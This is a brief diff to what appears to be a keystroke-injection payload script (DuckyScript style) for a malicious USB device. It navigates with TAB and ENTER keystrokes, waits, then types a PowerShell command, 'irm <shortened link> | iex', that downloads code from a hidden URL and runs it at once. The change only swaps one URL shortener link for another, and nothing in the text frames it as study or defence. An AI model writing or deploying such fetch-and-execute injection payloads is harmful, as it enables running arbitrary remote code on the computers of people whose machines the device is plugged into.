@@ -39,5 +39,5 @@ TAB
 TAB
 ENTER
 DELAY 2000
-STRING irm https://shorturl.at/yJNV8 | iex
+STRING irm https://bit.ly/3GeBQfR | iex
 ENTER
